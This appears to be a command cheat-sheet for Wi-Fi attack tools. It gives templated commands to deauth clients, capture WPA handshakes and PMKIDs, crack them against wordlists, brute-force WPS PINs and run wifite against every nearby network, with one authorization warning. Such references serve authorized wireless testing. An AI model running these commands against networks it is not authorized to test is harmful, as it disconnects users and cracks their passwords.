;; Wi-Fi auditing: the aircrack-ng suite and friends.

%tool airmon-ng
%cat command
%tags wireless,setup

@ Kill interfering processes, then enable monitor mode || sudo airmon-ng check kill && sudo airmon-ng start {{iface}}
~ monitor
? wifi monitor mode setup
The interface usually reappears renamed with a `mon` suffix (e.g. `wlan0` → `wlan0mon`) — check with `iw dev` if a later command can't find it.

@ Return the interface to normal (managed) mode || sudo airmon-ng stop {{ifacemon}}
~ restore

%tool airodump-ng
%tags wireless,recon

@ Survey nearby networks and clients || sudo airodump-ng {{ifacemon}}
~ survey
? see all wifi networks nearby

@ Focus capture on one AP (needed before a handshake capture) || sudo airodump-ng -c {{channel}} --bssid {{bssid}} -w {{outfile:capture}} {{ifacemon}}
~ capture
? capture wpa handshake specific network

%tool aireplay-ng
%tags wireless,attack

@ Deauth a client to force a handshake/re-association || sudo aireplay-ng -0 {{count:5}} -a {{bssid}} -c {{client_mac}} {{ifacemon}}
~ deauth
! knocks a real client offline — only against networks you're authorized to test
`-c` can be omitted to deauth every client on the AP at once.

%tool aircrack-ng
%tags wireless,cracking

@ Crack a captured handshake against a wordlist || aircrack-ng {{capture.cap}} -w {{wordlist:/usr/share/wordlists/rockyou.txt}} -b {{bssid}}
~ crack
? wpa2 handshake crack password

%tool hcxdumptool
%tags wireless,capture,pmkid

@ Capture PMKID + handshakes (no client needed for PMKID) || sudo hcxdumptool -i {{ifacemon}} -o {{outfile:capture.pcapng}} --enable_status=1
~ capture
? clientless wifi attack modern

%tool hcxpcapngtool
@ Convert a capture to hashcat's format || hcxpcapngtool -o {{outfile.22000}} {{capture.pcapng}}
~ convert
Crack the result with `hashcat -m 22000` — this replaced the older `-m 2500`/`aircrack-ng` handshake workflow for anything captured with hcxdumptool.

%tool wifite
%cat tool
%tags wireless,automation

@ Fully automated audit of nearby networks || sudo wifite
~ auto
? automatic wifi attack all networks
Handles monitor mode, target selection, handshake/PMKID capture and a crack attempt against a bundled wordlist on its own — good default when you just need a fast answer, less precise than driving the aircrack-ng suite by hand.

@ Target one network by BSSID only || sudo wifite -b {{bssid}}
~ targeted

%tool reaver
%tags wireless,wps

@ Brute-force a WPS pin (if WPS is enabled — often is) || sudo reaver -i {{ifacemon}} -b {{bssid}} -vv
~ wps
? wps pin attack
